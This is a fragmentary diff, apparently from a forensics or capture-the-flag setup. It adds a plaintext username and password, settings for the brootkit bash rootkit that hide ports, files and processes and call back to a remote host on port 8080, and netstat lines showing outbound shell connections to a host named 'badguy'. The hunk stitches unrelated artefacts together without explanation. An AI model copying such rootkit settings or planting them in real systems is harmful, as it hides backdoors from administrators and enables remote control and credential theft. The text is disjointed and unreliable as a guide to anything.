@@ -152,13 +152,21 @@ vmY0+I0N+fupndvL2bUWHR2Ftle+ZMHFSHgn2jLvkOfjful9XKjs2Ys=
 
 FILENAME = stolen
 
+comrade::StudentMidwayPassword
 
+HIDE_PORT		8080,8899
+HIDE_FILE		br.conf,bashbd.sh,brootkit,.bdrc,brdaemon,wzt
+HIDE_PROC		bashbd,brootkit,pty.spawn,brdaemon
+REMOTE_HOST		192.168.215.128
+REMOTE_PORT		8080
+SLEEP_TIME		60
 
+tcp        0      0 lin.intranet.donov:3201 192.168.28.100:45450    ESTABLISHED
+tcp        0      1 lin.intranet.dono:43222 badguy:shell            SYN_SENT   
 
-
-
-
-
+tcp   SYN-SENT  0       1                           192.168.150.253:43222           192.168.56.1:shell 
+tcp   SYN-SENT  0       1                           192.168.150.253:43238           192.168.56.1:shell                                                                            @@badguy:514
+127.0.0.1:6010          0.0.0.0:*               LISTEN      59099/sshd: comrade
 
 
 
